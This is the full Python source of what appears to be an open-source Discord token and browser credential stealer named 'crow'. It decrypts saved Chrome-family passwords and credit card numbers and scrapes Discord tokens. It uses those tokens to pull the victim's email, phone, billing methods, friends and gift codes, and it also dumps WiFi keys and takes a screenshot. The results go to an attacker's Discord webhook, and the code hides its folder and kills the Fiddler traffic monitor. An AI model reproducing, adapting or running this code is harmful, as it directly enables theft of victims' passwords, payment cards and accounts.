import os
os.system("python -m pip install requests psutil pycryptodome pystyle wmi getmac pyautogui discord_webhook Pillow")

import re
import wmi
import json
import uuid
import base64
import psutil
import random
import string
import shutil
import ctypes
import pathlib
import sqlite3
import platform
import requests
import threading
import pyautogui
import subprocess
import win32crypt
from pathlib import Path
from datetime import datetime
from Crypto.Cipher import AES
from discord_webhook import DiscordWebhook, DiscordEmbed


try:
    os.mkdir(str(Path.home()) + "/.crow")
except:
    pass
ctypes.windll.kernel32.SetFileAttributesW(str(Path.home()) + "/.crow", 2)

# Webhook url
WEBHOOK_URL = 'WEBHOOK_HERE'
PING_ON_HIT = False
SYSTEM_INFO = False
PASSWORD_STEALER = False
colors = [ 0x2b2d31 ]
base_path = str(pathlib.Path.home()) + "/.crow/"

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

random_string = get_random_string(8)
appdata = os.getenv('LOCALAPPDATA')

browsers = [
    appdata + '\\Amigo\\User Data',
    appdata + '\\Torch\\User Data',
    appdata + '\\Kometa\\User Data',
    appdata + '\\Orbitum\\User Data',
    appdata + '\\CentBrowser\\User Data',
    appdata + '\\7Star\\7Star\\User Data',
    appdata + '\\Sputnik\\Sputnik\\User Data',
    appdata + '\\Vivaldi\\User Data',
    appdata + '\\Google\\Chrome SxS\\User Data',
    appdata + '\\Google\\Chrome\\User Data',
    appdata + '\\Epic Privacy Browser\\User Data',
    appdata + '\\Microsoft\\Edge\\User Data',
    appdata + '\\uCozMedia\\Uran\\User Data',
    appdata + '\\Yandex\\YandexBrowser\\User Data',
    appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    appdata + '\\Iridium\\User Data',
]

FileName = 116444736000000000
NanoSeconds = 10000000

def ConvertDate(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def get_master_key(browser_path):
    try:
     with open(browser_path + '\\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    except:
        return
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"
    
def get_password(browser_path, i):
    master_key = get_master_key(browser_path)
    login_db = browser_path + '\\default\\Login Data'
    try:
        shutil.copy2(login_db, "./Loginvault.db")  
    except:
        return

    conn = sqlite3.connect("./Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                with open(f"{base_path}/{random_string}/pwds_{i}.txt", "a", encoding="utf-8") as f:
                    f.write("\n" + "="*50)
                    f.write("\nURL: " + url + "\n")
                    f.write("User Name: " + username + "\n")
                    f.write("Password: " + decrypted_password + "\n")
                    f.write("="*50 + "\n")

    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass

def get_credit_cards(browser_path, i):
    master_key = get_master_key(browser_path)
    login_db = browser_path + '\\default\\Web Data'
    try:
        shutil.copy2(login_db, "CCvault.db")                      
    except:
        return
    
    conn = sqlite3.connect("CCvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            with open(f"{base_path}/{random_string}/credit_{i}.txt", "a", encoding="utf-8") as f:
                f.write("\n" + "="*50)
                f.write("\nName in Card: " + username + "\n")
                f.write("Number: " + decrypted_password + "\n")
                f.write("Expire Month: " + str(expire_mon) + "\n")
                f.write("Expire Year: " + str(expire_year) + "\n")
                f.write("="*50 + "\n")

    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except Exception as e:
        pass

def get_files():
    i = 0
    os.mkdir(f"{base_path}/{random_string}")
    for path in browsers:
        i += 1
        get_password(path, i)
        get_credit_cards(path, i)

# ============================================================================================================================== #

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore') if x.strip()]:
                for regex in (r'mfa\.[\w-]{84}', r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
    except Exception as e:
        pass

    return tokens

def calc_flags(flags: int) -> list:
    flags_dict = {
        "DISCORD_EMPLOYEE": {
            "emoji": "<:staff:968704541946167357>",
            "shift": 0,
            "ind": 1
        },
        "DISCORD_PARTNER": {
            "emoji": "<:partner:968704542021652560>",
            "shift": 1,
            "ind": 2
        },
        "HYPESQUAD_EVENTS": {
            "emoji": "<:hypersquad_events:968704541774192693>",
            "shift": 2,
            "ind": 4
        },
        "BUG_HUNTER_LEVEL_1": {
            "emoji": "<:bug_hunter_1:968704541677723648>",
            "shift": 3,
            "ind": 4
        },
        "HOUSE_BRAVERY": {
            "emoji": "<:hypersquad_1:968704541501571133>",
            "shift": 6,
            "ind": 64
        },
        "HOUSE_BRILLIANCE": {
            "emoji": "<:hypersquad_2:968704541883261018>",
            "shift": 7,
            "ind": 128
        },
        "HOUSE_BALANCE": {
            "emoji": "<:hypersquad_3:968704541874860082>",
            "shift": 8,
            "ind": 256
        },
        "EARLY_SUPPORTER": {
            "emoji": "<:early_supporter:968704542126510090>",
            "shift": 9,
            "ind": 512
        },
        "BUG_HUNTER_LEVEL_2": {
            "emoji": "<:bug_hunter_2:968704541774217246>",
            "shift": 14,
            "ind": 16384
        },
        "VERIFIED_BOT_DEVELOPER": {
            "emoji": "<:verified_dev:968704541702905886>",
            "shift": 17,
            "ind": 131072
        },
        "ACTIVE_DEVELOPER": {
            "emoji": "<:Active_Dev:1045024909690163210>",
            "shift": 22,
            "ind": 4194304
        },
        "CERTIFIED_MODERATOR": {
            "emoji": "<:certified_moderator:988996447938674699>",
            "shift": 18,
            "ind": 262144
        },
        "SPAMMER": {
            "emoji": "⌨",
            "shift": 20,
            "ind": 1048704
        },
    }

    return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]

def geolocation(ip):
    url = f"https://ipapi.co/{ip}/json/"
    response = requests.get(url, headers={
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
    data = response.json()

    return (data["country"], data["region"], data["city"], data["postal"], data["asn"])

def check_tokens(tokens, webhook):
    for token in tokens:
        check = requests.get(f"https://discord.com/api/v9/users/@me", headers={'authorization':  token})
        if check.status_code == 200:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
            badges = ' '.join([flag[0] for flag in calc_flags(user['public_flags'])])

            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"

            if user['premium_type'] == 0:
                nitro = 'None'
            elif user['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro = 'Nitro'
            elif user['premium_type'] == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'None'

            if billing:
                payment_methods = []

                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('💳')

                    elif method['type'] == 2:
                        payment_methods.append("<:paypal:973417655627288666>")

                    else:
                        payment_methods.append('❓')

                payment_methods = ', '.join(payment_methods)
            else:
                payment_methods = None

            if friends:
                hq_friends = []
                for friend in friends:
                    unprefered_flags = [64, 128, 256, 1048704]
                    inds = [flag[1] for flag in calc_flags(
                        friend['user']['public_flags'])[::-1]]
                    for flag in unprefered_flags:
                        inds.remove(flag) if flag in inds else None
                    if inds != []:
                        hq_badges = ' '.join([flag[0] for flag in calc_flags(friend['user']['public_flags'])[::-1]])
                        data = f"`{hq_badges} - {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`"

                        if len('\n'.join(hq_friends)) + len(data) >= 1024:
                            break

                        hq_friends.append(data)

                if len(hq_friends) > 0:
                    hq_friends = '\n'.join(hq_friends)

                else:
                    hq_friends = None

            else:
                hq_friends = None

            if gift_codes:
                codes = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code = code['code']

                    data = f":gift: `{name}`\n:ticket: `{code}`"

                    if len('\n\n'.join(codes)) + len(data) >= 1024:
                        break

                    codes.append(data)

                if len(codes) > 0:
                    codes = '\n\n'.join(codes)

                else:
                    codes = None

            else:
                codes = None

            embed = DiscordEmbed(title=f"{username} ({user_id})", color=random.choice(colors))
            embed.set_thumbnail(avatar)
            embed.add_embed_field("<a:token:1107237207791652915> Token:", f"```{token}```\n\u200b", False)
            embed.add_embed_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
            embed.add_embed_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_embed_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
            embed.add_embed_field(name="<:mfa:1021604916537602088> MFA:", value=f"{mfa}", inline=True)
            embed.add_embed_field(name="\u200b", value="\u200b", inline=False)
            embed.add_embed_field(name="<:email_open:1107236171358142464>  Email:", value=f"{email if email != None else 'None'}", inline=True)
            embed.add_embed_field(name="📱 Phone:", value=f"{phone if phone != None else 'None'}", inline=True)
            embed.add_embed_field(name="\u200b", value="\u200b", inline=False)
            if hq_friends != None:
                embed.add_embed_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
                embed.add_embed_field(name="\u200b", value="\u200b", inline=False)
            if codes != None:
                embed.add_embed_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                embed.add_embed_field(name="\u200b", value="\u200b", inline=False)

            embed.set_footer(text="github.com/maxi-schaefer/crow")
            webhook.add_embed(embed)
# ============================================================================================================================== #

def killfiddler():
    for proc in psutil.process_iter():
        if proc.name() == "Fiddler.exe":
            proc.kill()
threading.Thread(target=killfiddler).start()

# ============================================================================================================================== #

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

def get_id():
    return str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

def system_info(webhook):
    GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
    NameDisplay = 3

    size = ctypes.pointer(ctypes.c_ulong(0))
    GetUserNameEx(NameDisplay, None, size)

    nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
    GetUserNameEx(NameDisplay, nameBuffer, size)

    display_name = nameBuffer.value
    hostname = os.getenv("COMPUTERNAME")
    username = os.getenv("USERNAME")

    embed = DiscordEmbed("System Information", color=random.choice(colors))

    embed.add_embed_field(":bust_in_silhouette: User", f"```Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}```", False)

    cpu = wmi.WMI().Win32_Processor()[0].Name
    gpu = wmi.WMI().Win32_VideoController()[0].Name
    ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
    hwid = get_id()

    embed.add_embed_field("<:CPU:1004131852208066701> System", f"```CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}```", False)

    disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
    for part in psutil.disk_partitions(all=False):
        if os.name == 'nt':
            if 'cdrom' in part.opts or part.fstype == '':
                continue
        usage = psutil.disk_usage(part.mountpoint)
        disk += ("{:<9} "*4).format(part.device, str(
            usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"
        
    embed.add_embed_field(":floppy_disk: Disk", f"```{disk}```", False)

    ip = requests.get(
    "https://www.cloudflare.com/cdn-cgi/trace").text.split("ip=")[1].split("\n")[0]
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    country, region, city, zip_, as_ = geolocation(ip)

    embed.add_embed_field(":satellite: Network", "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}```".format(
                ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_), False)
    
    networks, out = [], ''
    try:
        wifi = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'], shell=True,
            stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
        wifi = [i.split(":")[1][1:-1]
                for i in wifi if "All User Profile" in i]

        for name in wifi:
            try:
                results = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                    stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                results = [b.split(":")[1][1:-1]
                            for b in results if "Key Content" in b]
            except subprocess.CalledProcessError:
                networks.append((name, ''))
                continue

            try:
                networks.append((name, results[0]))
            except IndexError:
                networks.append((name, ''))

    except subprocess.CalledProcessError:
        pass
    except UnicodeDecodeError:
        pass

    out += f'{"SSID":<20}| {"PASSWORD":<}\n'
    out += f'{"-"*20}|{"-"*29}\n'
    for name, password in networks:
        out += '{:<20}| {:<}\n'.format(name, password)

    embed.add_embed_field(":signal_strength: WiFi", f"```{out}```", False)

    webhook.add_embed(embed)

# ============================================================================================================================== #


def uuid_dashed(uuid):
    return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    ip_addr = requests.get('https://api.ipify.org').content.decode('utf8')
    pc_name = platform.node()
    pc_username = os.getenv("UserName")
    checked = []
    default_paths = {
            'Discord': roaming + '\\discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Lightcord': roaming + '\\Lightcord',
            'Discord PTB': roaming + '\\discordptb',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': local + '\\Amigo\\User Data',
            'Torch': local + '\\Torch\\User Data',
            'Kometa': local + '\\Kometa\\User Data',
            'Orbitum': local + '\\Orbitum\\User Data',
            'CentBrowser': local + '\\CentBrowser\\User Data',
            '7Star': local + '\\7Star\\7Star\\User Data',
            'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
            'Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Chrome1': local + '\\Google\\Chrome\\User Data\\Profile 1',
            'Chrome2': local + '\\Google\\Chrome\\User Data\\Profile 2',
            'Chrome3': local + '\\Google\\Chrome\\User Data\\Profile 3',
            'Chrome4': local + '\\Google\\Chrome\\User Data\\Profile 4',
            'Chrome5': local + '\\Google\\Chrome\\User Data\\Profile 5',
            'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
            'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User DataDefault',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    message = f'{"@here" if PING_ON_HIT else ""} **NEW HIT**'

    TokenWebhook = DiscordWebhook(url=WEBHOOK_URL , content=message, rate_limit_retry=True)         
    if PASSWORD_STEALER:
        get_files()
        shutil.make_archive(f"{base_path}/vault", 'zip', f"{base_path}/{random_string}")
        vaultMessage = "```📂 - Vault\n"
        for path in os.listdir(base_path + random_string):
            if os.path.isfile(os.path.join(base_path + random_string, path)):
                vaultMessage += f" ├─── 📄 - {path}\n"
        vaultMessage += " └────────────────────```"
        VaultEmbed = DiscordEmbed(title="__Vaults__", description=vaultMessage, color=random.choice(colors))
        TokenWebhook.add_embed(VaultEmbed)


    embedMsg = "None"
    for platforrm, path in default_paths.items():
        if not os.path.exists(path):
            continue
        
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                if token in checked:
                    continue
                checked.append(token)
                embedMsg += f"**📃 {platforrm}:** ```{token}```"
        else:
            embedMsg = 'No tokens found.'


    check_tokens(checked, TokenWebhook)
    if SYSTEM_INFO:
        system_info(TokenWebhook)


    screenshot = pyautogui.screenshot()
    screenshot.save(fr'{base_path + "now.png"}') 

    TokenWebhook.execute()

    FileWebhook = DiscordWebhook(WEBHOOK_URL)
    with open(base_path + 'now.png', "rb") as f:
        FileWebhook.add_file(f.read(), filename="now.png")
    if PASSWORD_STEALER:
        with open(base_path + f"/vault.zip", "rb") as f:
            FileWebhook.add_file(f.read(), filename="Crow vault.zip")

    FileWebhook.execute()

    if PASSWORD_STEALER:
        shutil.rmtree(base_path + random_string)
    os.remove(base_path + "/" + "now.png")
    if PASSWORD_STEALER:
        os.remove(base_path + "/" + "vault.zip")

if __name__ == '__main__':
    main()